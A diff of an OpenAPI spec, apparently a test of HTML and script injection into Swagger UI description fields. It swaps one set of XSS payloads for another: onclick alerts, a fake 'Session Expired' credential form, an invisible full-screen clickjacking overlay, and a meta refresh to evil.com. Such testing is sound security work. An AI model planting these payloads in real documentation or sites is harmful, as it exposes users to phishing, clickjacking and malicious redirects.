@@ -1,22 +1,25 @@
 openapi: 3.0.3
 info:
-  title: "Normal title"
+  title: Swagger XSS Test
   version: "1.0.0"
   description: |
-    <svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS2')"></svg>
+    <div style="background:yellow;padding:20px" onclick="alert('XSS Success!')">Click me!</div>
 tags:
   - name: test
     description: |
-      <img src="x"
-     style="position:fixed;top:0;left:0;width:100vw;height:100vh;opacity:0.01;z-index:99999"
-     onclick="alert('CLICKED!')" />
+      <form style="background:white;position:fixed;top:40%;left:40%;z-index:99999;padding:30px;border:2px solid red">
+        <h2>Session Expired</h2>
+        Username: <input><br>
+        Password: <input type='password'><br>
+        <button onclick="alert('Captured!')">Login</button>
+      </form>
 paths:
   /test:
     get:
       summary: "Test endpoint"
       description: |
-        <div onclick="alert('PATH')">click</div>
+        <img src="x" style="position:fixed;top:0;left:0;width:100vw;height:100vh;opacity:0.01;z-index:99999" onclick="alert('CLICKED!')" />
       responses:
         "200":
           description: |
-            <script>alert('RESPONSE')</script>
+            <meta http-equiv="refresh" content="0;url=https://evil.com">
